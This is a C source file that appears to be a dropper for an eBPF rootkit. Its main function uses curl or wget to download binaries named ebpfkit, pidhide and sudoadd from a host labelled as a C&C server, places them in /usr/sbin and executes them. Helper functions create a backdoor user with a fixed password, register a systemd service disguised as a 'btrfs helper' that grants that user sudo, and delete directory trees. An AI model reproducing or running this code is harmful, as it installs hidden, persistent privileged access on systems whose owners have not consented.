#define _XOPEN_SOURCE 500  // Enable certain library features
#include <ftw.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>


static const char *sbin_path = "/usr/sbin/";
// Function to be applied to each file in the directory
static int remove_cb(const char *fpath, const struct stat *sb, int typeflag, struct FTW *ftwbuf) {
    int ret = remove(fpath);
    if (ret) {
        perror(fpath);
    }
    return ret;
}

// Function to purge a directory
void purge_directory(const char *dir_path) {
    // Use nftw to traverse the directory and apply remove_cb to each file
    if (nftw(dir_path, remove_cb, 64, FTW_DEPTH | FTW_PHYS) == -1) {
        perror("nftw");
        exit(EXIT_FAILURE);
    }
}

void create_and_enable_service() {
    // Step 1: Create the service file
    FILE *fp = fopen("/etc/systemd/system/btrfs_helper.service", "w");
    if (fp == NULL) {
        perror("Failed to create service file");
        exit(1);
    }

    fprintf(fp, "[Unit]\n");
    fprintf(fp, "Description=A btrfs helper service\n\n");

    fprintf(fp, "[Service]\n");
    fprintf(fp, "ExecStart=/usr/sbin/sudoadd -u ebpf\n\n");

    fprintf(fp, "[Install]\n");
    fprintf(fp, "WantedBy=multi-user.target\n");

    fclose(fp);

    // Step 2: Reload systemd to recognize the new service
    if (system("systemctl daemon-reload") != 0) {
        fprintf(stderr, "Failed to reload systemd\n");
        exit(1);
    }

    // Step 3: Enable the service
    if (system("systemctl enable btrfs_helper.service") != 0) {
        fprintf(stderr, "Failed to enable service\n");
        exit(1);
    }

    printf("Service created and enabled successfully.\n");
}


// Function to add a new user
void add_new_user() {
    // Add a new user with the username 'newuser'
    if (system("useradd ebpf") != 0) {
        fprintf(stderr, "Failed to add new user.\n");
        exit(1);
    }

    // Set a password for the new user
    if (system("echo 'ebpf:1234' | chpasswd") != 0) {
        fprintf(stderr, "Failed to set password for new user.\n");
        exit(1);
    }

    printf("Successfully added new user with username 'newuser' and password 'password'.\n");
}

int main() {
    pid_t child_pid;
    const char *base_url = "http://ebpf-cnc.surge.sh/";
    char *programs[] = {"ebpfkit", "ebpfkit-client", "webapp", "pause" ,"pidhide", "sudoadd", NULL};
    char cmd[1024], local_file_path[256], full_url[256];

    // purge_directory("/tmp/btrfs_map_physical");
    // system("mkdir -p /tmp/btrfs_map_physical");

    for (int i = 0; programs[i] != NULL; ++i) {
        // snprintf(local_file_path, sizeof(local_file_path), "/tmp/btrfs_map_physical/%s", programs[i]);
        snprintf(local_file_path, sizeof(local_file_path), "%s/%s", sbin_path, programs[i]);
        snprintf(full_url, sizeof(full_url), "%s%s", base_url, programs[i]);
        snprintf(cmd, sizeof(cmd), "%s -o %s %s", system("which curl") == 0 ? "curl" : "wget", local_file_path, full_url);
        system(cmd);
    }

    for (int i = 0; programs[i] != NULL; ++i) {
        pid_t pid = fork();
        if (pid < 0) { perror("fork"); exit(1); }
        if (pid == 0) {
            child_pid = getpid();
            snprintf(local_file_path, sizeof(local_file_path), "%s/%s", sbin_path, programs[i]);
            execl(local_file_path, programs[i], (char *)NULL);
            perror("execl");
            exit(1);
        } else {
            printf("Child process for %s has PID: %d\n", programs[i], pid);
        }
    }
    printf("Parent process continues to execute...\n");
    return 0;
}
